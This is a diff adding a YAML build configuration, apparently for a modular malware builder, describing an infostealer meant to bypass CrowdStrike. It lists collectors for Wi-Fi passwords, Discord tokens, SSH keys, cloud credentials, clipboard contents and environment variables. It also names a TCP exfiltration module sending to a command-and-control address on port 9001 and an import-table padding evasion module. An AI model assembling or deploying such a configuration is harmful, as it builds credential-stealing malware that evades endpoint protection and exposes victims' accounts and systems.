@@ -1,0 +1,33 @@
+name: infostealer_cs_full_working
+description: CrowdStrike-bypassing infostealer with all working collectors (no browser_chromium, no screenshot)
+
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+
+collectors:
+- collectors/system_info_api
+- collectors/processes_api
+- collectors/installed_software
+- collectors/env_vars
+- collectors/clipboard
+- collectors/wifi_passwords
+- collectors/discord_tokens
+- collectors/ssh_keys
+- collectors/cloud_creds
+- collectors/drives
+- collectors/recent_files
+- collectors/startup_items
+- collectors/security_products
+
+exfil: exfil/tcp_dynamic
+arch: arch/sequential
+resources: true
+
+evasion:
+- evasion/iat_pad
+
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
